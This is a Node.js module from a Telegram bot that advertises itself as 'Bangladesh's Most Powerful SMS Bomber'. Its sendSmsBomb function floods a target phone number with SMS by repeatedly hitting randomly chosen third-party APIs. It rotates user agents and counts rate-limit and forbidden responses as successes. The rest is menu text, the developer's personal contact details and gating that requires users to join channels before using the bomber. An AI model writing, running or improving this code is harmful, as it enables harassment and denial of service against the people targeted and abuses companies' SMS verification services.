const axios = require('axios');
const { APIS, getRandomUserAgent } = require('./apis');
const config = require('./config');

async function sendApiRequest(api, number) {
    try {
        const headers = {
            'User-Agent': getRandomUserAgent(),
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive'
        };
        
        let data = api.data(number);
        let response;
        
        if (api.method === 'GET') {
            response = await axios.get(api.url, { params: data, headers, timeout: config.API_TIMEOUT });
        } else {
            if (api.type === 'json') {
                response = await axios.post(api.url, data, { headers, timeout: config.API_TIMEOUT });
            } else if (api.type === 'form') {
                const formData = new URLSearchParams(data);
                response = await axios.post(api.url, formData, { headers, timeout: config.API_TIMEOUT });
            } else {
                response = await axios.post(api.url, data, { headers, timeout: config.API_TIMEOUT });
            }
        }
        
        return [200, 201, 202, 204, 400, 403, 429].includes(response.status);
    } catch (error) {
        return false;
    }
}

async function sendSmsBomb(number, count, onProgress) {
    let success = 0;
    let failed = 0;
    
    for (let i = 0; i < count; i++) {
        const apiCount = Math.min(Math.floor(Math.random() * 3) + 3, APIS.length);
        const shuffled = [...APIS].sort(() => 0.5 - Math.random());
        const selectedApis = shuffled.slice(0, apiCount);
        
        for (const api of selectedApis) {
            const result = await sendApiRequest(api, number);
            if (result) {
                success++;
            } else {
                failed++;
            }
            await new Promise(r => setTimeout(r, 200));
        }
        
        if (onProgress) {
            onProgress(i + 1, count, success, failed);
        }
        
        await new Promise(r => setTimeout(r, 500));
    }
    
    return { success, failed };
}

function formatNumber(number) {
    return `${number.slice(0, 3)}*******`;
}

function getWelcomeMessage(firstName, year) {
    return `
*✨ WELCOME TO BD SMS MASTER! ✨*

🔥 *Bangladesh's Most Powerful SMS Bomber*
👑 *Developed by MAINUL ISLAM*

━━━━━━━━━━━━━━━━━━━━━
*📌 Before using this bot, you must verify:*
━━━━━━━━━━━━━━━━━━━━━

✅ *Join our Telegram Channel*
✅ *Join our Telegram Group*  
✅ *Subscribe on YouTube*

*⚠️ After completing all 3 tasks, click VERIFY to unlock the bomber!*

━━━━━━━━━━━━━━━━━━━━━
*💫 Click the buttons below to join:*
━━━━━━━━━━━━━━━━━━━━━

© ${year} MAINUL ISLAM
    `;
}

function getVerifiedMenu(year) {
    return `
*✅ VERIFICATION COMPLETE! ✅*

*🔥 You can now use the SMS Bomber!*

━━━━━━━━━━━━━━━━━━━━━
*📌 Available Commands:*
━━━━━━━━━━━━━━━━━━━━━

*/bomb* - 💣 Start SMS Bombing
*/status* - 📊 Bot Status
*/stats* - 📈 Your Statistics
*/about* - 👨‍💻 Developer Info
*/ping* - 🏓 Check Bot Status
*/help* - 🆘 Support

━━━━━━━━━━━━━━━━━━━━━
*⚡ Click buttons below to start!*
━━━━━━━━━━━━━━━━━━━━━

© ${year} MAINUL ISLAM
    `;
}

function getAboutText(year, datetime) {
    return `
*👨‍💻 DEVELOPER INFORMATION*

🔹 *Name:* MAINUL ISLAM
🔹 *Location:* Bangladesh 🇧🇩
🔹 *GitHub:* M41NUL
🔹 *Telegram:* @mdmainulislaminfo
🔹 *WhatsApp:* +8801308850528
🔹 *Email:* githubmainul@gmail.com

━━━━━━━━━━━━━━━━━━━━━
📅 *Version:* 2.0.0
⏰ *Server Time:* ${datetime}
━━━━━━━━━━━━━━━━━━━━━
© ${year} MAINUL ISLAM
⚡ All Rights Reserved
━━━━━━━━━━━━━━━━━━━━━
    `;
}

function getStatusText(year, datetime, apiCount) {
    return `
*📊 BOT STATUS*

✅ *Status:* ONLINE
👑 *Developer:* MAINUL ISLAM
📅 *Version:* 2.0.0
⏰ *Server Time:* ${datetime}
📱 *APIs Loaded:* ${apiCount}+
🖥️ *Platform:* Railway Cloud

━━━━━━━━━━━━━━━━━━━━━
🔥 *Ready to serve!*
© ${year} MAINUL ISLAM
━━━━━━━━━━━━━━━━━━━━━
    `;
}

module.exports = {
    sendApiRequest,
    sendSmsBomb,
    formatNumber,
    getWelcomeMessage,
    getVerifiedMenu,
    getAboutText,
    getStatusText
};
